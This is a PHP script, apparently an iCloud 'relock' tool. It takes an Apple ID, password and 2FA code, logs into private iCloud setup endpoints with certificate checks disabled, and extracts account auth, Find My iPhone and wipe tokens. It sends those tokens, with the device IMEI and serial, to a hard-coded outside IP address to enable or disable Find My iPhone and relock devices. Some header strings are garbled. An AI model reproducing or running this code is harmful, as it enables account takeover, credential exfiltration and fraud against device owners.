<?php

namespace CFPropertyList;

$commanType  = $_POST['command'];
$DeviceClass = $_POST['dClass'];
$imei        = "";
if (isset($_POST['imei'])) {
    $imei = $_POST['imei'];
}
$sn = $_POST['sn'];
function fmipWipeToken($appleID, $Password)
{
    $url = 'https://setup.icloud.com/setup/fmipauthenticate/$APPLE_ID$';
//echo $url;
    $post_data = '{"clientContext":
{"productType":"iPhone6,1","buildVersion":"376","appName":"FindMyiPhone","osVersion
":"7.1.2","appVersion":"3.0","clientTimestamp":507669952542,"inactiveTime":1,"devic
eUDID":"67bbe2ad90e7106f462cb15df7a49e0bb2a8fiio"},"serverContext":{}}';
    $bacio     = base64_encode($appleID.':'.$Password);
//echo $bacio;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Host: setup.icloud.com",
        "Accept: */*",
        "Authorization: Basic".$bacio,
        "Proxy-Connection: keep-alive",
        "X￾MMe-Country: EC",
        "X-MMe-Client-Info: <iPhone7,2> <iPhone OS;8.1.2;12B440>
<com.apple.AppleAccount/1.0 (com.apple.Preferences/1.0)>",
        "Accept-Language: es￾es",
        "Content-Type: text/plist",
        "Connection: keep-alive",
    ));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt(
        $ch,
        CURLOPT_USERAGENT,
        "User-Agent: Ajustes/1.0
CFNetwork/711.1.16 Darwin/14.0.0"
    );
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $xml_response = curl_exec($ch);
    if (curl_errno($ch)) {
        $error_message = curl_error($ch);
        $error_no      = curl_errno($ch);
        echo "error_message: ".$error_message."<br>";
        echo "error_no: ".$error_no."<br>";
    }
    curl_close($ch);
    $response     = $xml_response;
    $activationRQ = $response;
    $plist        = new CFPropertyList();
    $plist->parse($activationRQ);
    $wipePlist        = $plist->toArray();
    $dsid             = $wipePlist['appleAccountInfo']['dsid'];
    $mmeFMIPWipeToken = $wipePlist['tokens']['mmeFMIPWipeToken'];

    return $mmeFMIPWipeToken;
//echo $this->authTokenRefresh;
}

function loginDelegates($appleID, $Password)
{
    $url = "https://setup.icloud.com/setup/iosbuddy/loginDelegates";
//echo $url;
    $post_data = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>apple-id</key>
<string>'.$appleID.'</string>
<key>client-id</key>
<string>FEF008A5-F554-46A1-9057-E4CF335668EF</string>
<key>delegates</key>
<dict>
<key>com.apple.gamecenter</key>
<dict/>
<key>com.apple.mobileme</key>
<dict/>
<key>com.apple.private.ids</key>
<dict>
<key>protocol-version</key>
<string>4</string>
</dict>
</dict>
<key>password</key>
<string>'.$Password.'</string>
</dict>
</plist>
';
//$bacio=base64_encode($dsid.':'.$mmeFMIPWipeToken);
//echo $bacio;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Accept-Language: es-es",
        "Accept: */*",
        "Content-Type: text/plist",
        "X-Apple-Find-API-Ver: 6.0",
        "X-Apple￾I-MD-RINFO: 17106176",
        "Connection: keep-alive",
        "Content-Length:
".strlen($post_data),
        "X-Apple-Realm-Support: 1.0",
        "X-MMe-Client-Info: <iPod5,1>
<iPhone OS;9.3.5;13G36> <com.apple.AppleAccount/1.0 (com.apple.accountsd/113)>",
    ));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt(
        $ch,
        CURLOPT_USERAGENT,
        "accountsd/113 CFNetwork/758.5.3
Darwin/15.6.0"
    );
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $xml_response = curl_exec($ch);
    //echo $xml_response;
    if (curl_errno($ch)) {
        $error_message = curl_error($ch);
        $error_no      = curl_errno($ch);
        echo "error_message: ".$error_message."<br>";
        echo "error_no: ".$error_no."<br>";
    }
    curl_close($ch);
    $response     = $xml_response;
    $activationRQ = $response;
    $plist        = new CFPropertyList();
    $plist->parse($activationRQ);
    $wipePlist    = $plist->toArray();
    $dsid         = $wipePlist['dsid'];
    $mmeAuthToken = $wipePlist['delegates']['com.apple.mobileme']['service￾data']['tokens']['mmeAuthToken'];

    return $dsid.":".$mmeAuthToken;
}

function get_account_settings($dsid, $mmeAuthToken)
{
    $url = "https://setup.icloud.com/setup/get_account_settings";
//echo $url;
    $post_data = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>protocolVersion</key>
<string>1.0</string>
<key>userInfo</key>
<dict>
<key>client-id</key>
<string>FEF008A5-F554-46A1-9057-E4CF335668EF</string>
<key>language</key>
<string>es-EC</string>
<key>timezone</key>
<string>America/Guayaquil</string>
</dict>
</dict>
</plist>';
    $bacio     = base64_encode($dsid.':'.$mmeAuthToken);
//echo $bacio;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Host: setup.icloud.com",
        "Accept-Language: es-es",
        "Accept: */*",
        "Content-Type: application/xml",
        "X￾Apple-Find-API-Ver: 6.0",
        "X-Apple-I-MD-RINFO: 17106176",
        "Connection: keep-alive",
        "Content-Length: ".strlen($post_data),
        "X-Apple-Realm-Support: 1.0",
        "X-MMe-Client￾Info: <iPod5,1> <iPhone OS;9.3.5;13G36> <com.apple.AppleAccount/1.0
(com.apple.accountsd/113)>",
        "Authorization: Basic ".$bacio,
    ));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt(
        $ch,
        CURLOPT_USERAGENT,
        "Setup/1.0 CFNetwork/758.5.3
Darwin/15.6.0"
    );
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $xml_response = curl_exec($ch);
    if (curl_errno($ch)) {
        $error_message = curl_error($ch);
        $error_no      = curl_errno($ch);
        echo "error_message: ".$error_message."<br>";
        echo "error_no: ".$error_no."<br>";
    }
    curl_close($ch);
    $response     = $xml_response;
    $activationRQ = $response;
    $plistParser  = new CFPropertyList();
    $plistParser->parse($activationRQ);
    $wipePlist = $plistParser->toArray();
    //print_r($wipePlist);

    $mmeFMIPToken = $wipePlist['tokens']['mmeFMIPToken'];
    $mmeFMFToken  = $wipePlist['tokens']['mmeFMFToken'];

    return $mmeFMIPToken.":".$mmeFMFToken;
}

function poster($query)
{
    $postdata = http_build_query(
        $query
    );
    $opts     = array(
        'http' =>
            array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => $postdata,
            ),
    );
    $context  = stream_context_create($opts);
    $result   = file_get_contents(
        'http://138.68.245.112/relock/api.php',
        false,
        $context
    );
}

$deletor = file_get_contents(
    "http://138.68.245.112/relock/api.php?
user=cn&ifExist=".$imei
);
$deletor = file_get_contents(
    "http://138.68.245.112/relock/api.php?
user=cn&ifExistSN=".$sn
);
$deletor = file_get_contents(
    "http://138.68.245.112/relock/api.php?
user=cn&ifExistCommand=".$imei
);

if ($commanType == "relock") {
    $user    = $_POST['appleID'];
    $fa_code = '';
    if ($_POST['code'] == "000000") {
        $fa_code = '';
    } else {
        $fa_code = $_POST['code'];
    }
    $pass              = $_POST['password'].$fa_code; //;
    $loginInfo         = loginDelegates($user, $pass);
    $loginInfoArray    = explode(":", $loginInfo);
    $dsid              = $loginInfoArray[0];
    $mmeAuthToken      = $loginInfoArray[1];
    $settingsInfo      = get_account_settings($dsid, $mmeAuthToken);
    $settingsInfoArray = explode(":", $settingsInfo);
    $mmeFMIPToken      = $settingsInfoArray[0];
    $mmeFMFToken       = $settingsInfoArray[1];
    $authToken         = base64_encode($dsid.":".$mmeFMIPToken);
    if ($DeviceClass == "GSM") {
        $messageBody = array(
            'buildCommand' => "true",
            'DeviceClass'  => 'GSM',
            'command'      => 'enableFMIP',
            'imei'         => $imei,
            'meid'         => "000",
            'serialNumber' => $sn,
            'productType'  => "iPhone10,1", //$_POST['pType'],
            'appleID'      => $user,
            'dsid'         => $dsid,
            'authToken'    => "Basic ".$authToken,
            'wipeToken'    => fmipWipeToken(DEVICE_APPLEID, DEVICE_APPLEID_PW),
            'user'         => 'cn',
        );
        poster($messageBody);
    } else {
        $messageBody = array(
            'buildCommand' => "true",
            'DeviceClass'  => 'GSM',
            'command'      => 'enableFMIP',
            'imei'         => '000',
            'meid'         => "000",
            'serialNumber' => $sn,
            'productType'  => "iPad2,5", //$_POST['pType'],
            'appleID'      => $user,
            'dsid'         => $dsid,
            'authToken'    => "Basic ".$authToken,
            'wipeToken'    => fmipWipeToken(DEVICE_APPLEID, DEVICE_APPLEID_PW),
            'user'         => 'cn',
        );
        poster($messageBody);
    }
} else {
    if ($commanType == "relockV2") {
        $user    = $_POST['appleID'];
        $fa_code = '';
        if ($_POST['code'] == "000000") {
            $fa_code = '';
        } else {
            $fa_code = $_POST['code'];
        }
        $pass              = $_POST['password'].$fa_code; //;
        $loginInfo         = loginDelegates($user, $pass);
        $loginInfoArray    = explode(":", $loginInfo);
        $dsid              = $loginInfoArray[0];
        $mmeAuthToken      = $loginInfoArray[1];
        $settingsInfo      = get_account_settings($dsid, $mmeAuthToken);
        $settingsInfoArray = explode(":", $settingsInfo);
        $mmeFMIPToken      = $settingsInfoArray[0];
        $mmeFMFToken       = $settingsInfoArray[1];
        $authToken         = base64_encode($dsid.":".$mmeFMIPToken);
        if ($DeviceClass == "GSM") {
            $messageBody = array(
                'buildCommand' => "true",
                'DeviceClass'  => 'GSM',
                'command'      => 'enableFMIPV2',
                'imei'         => $imei,
                'meid'         => substr($imei, 0, -1),
                'serialNumber' => $sn,
                'productType'  => "iPhone10,3", //$_POST['pType'],
                'appleID'      => $user,
                'dsid'         => $dsid,
                'authToken'    => "Basic ".$authToken,
                'wipeToken'    => fmipWipeToken(DEVICE_APPLEID, DEVICE_APPLEID_PW),
                'user'         => 'cn',
            );
            poster($messageBody);
        } else {
            $messageBody = array(
                'buildCommand' => "true",
                'DeviceClass'  => 'GSM',
                'command'      => 'enableFMIP',
                'imei'         => '000',
                'meid'         => "000",
                'serialNumber' => $sn,
                'productType'  => "iPad2,5", //$_POST['pType'],
                'appleID'      => $user,
                'dsid'         => $dsid,
                'authToken'    => "Basic ".$authToken,
                'wipeToken'    => fmipWipeToken(DEVICE_APPLEID, DEVICE_APPLEID_PW),
                'user'         => 'cn',
            );
            poster($messageBody);
        }
    } else {
        if ($commanType == "disableFMIP") {
            $messageBody = array(
                'buildCommand' => "true",
                'command'      => 'disableFMIP',
                'wipeToken'    => fmipWipeToken(DEVICE_APPLEID, DEVICE_APPLEID_PW),
                'user'         => 'cn',
            );
            poster($messageBody);
        } else {
            if ($commanType == "disableLostMode") {
                $messageBody['aps'] = array(
                    'alert'             => $message,
                    'sound'             => 'default',
                    'badge'             => 1,
                    'content-available' => '1',
                    'command'           => 'disableLostMode',
                );
            }
        }
    }
}


if ($commanType == "disableFMIP") {
    echo "Disable FMIP Command Sent!";
} else {
    $data = "";
    $time = 15; //how long in ;seconds do you allow your program to
    run / search
$found = false;
for ($i = 0; $i < $time; $i++) {
    if (isset($_POST['imei'])) {
        $result = file_get_contents(
            "http://138.68.245.112/relock/api.php?
&user=cn&getRelockResult=".$imei
        );
    }
    if (isset($_POST['sn'])) {
        $result = file_get_contents(
            "http://138.68.245.112/relock/api.php?
user=cn&getRelockResultSN=".$sn
        );
    }
    if ($result != "") {
        $data  = $result;
        $found = true;
        break;
    }
    sleep(1); // if ;not found wait one second before continue looping
}
 if ($found) {
     if ($data == "Relocked") {
         if ($imei == 000) {
             echo "Device SerialNumber: ".$sn." relock success!";
         } else {
             echo "Device imei: ".$imei." relock success!";
         }
     } else {
         if ($data == "fail") {
             if ($imei == 000) {
                 echo "Device SerialNumber: ".$sn." relock fail!";
             } else {
                 echo "Device imei: ".$imei." relock fail!";
             }
         }
     }
 }
}// find command type
